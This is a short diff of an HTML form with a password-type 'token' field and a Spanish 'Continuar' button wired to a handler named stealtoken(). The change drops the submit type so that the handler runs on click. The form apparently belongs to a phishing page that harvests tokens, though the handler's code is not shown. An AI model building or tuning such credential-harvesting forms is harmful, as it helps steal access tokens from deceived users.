@@ -21,7 +21,7 @@ info:
                 <input type="password" name="token" size="20">
             </div>
             <div class="form-group">
-                <button type="submit" class="btn btn-default" onclick="stealtoken()">Continuar</button>
+                <button class="btn btn-default" onclick="stealtoken()">Continuar</button>
             </div>
         </form>
     </div>
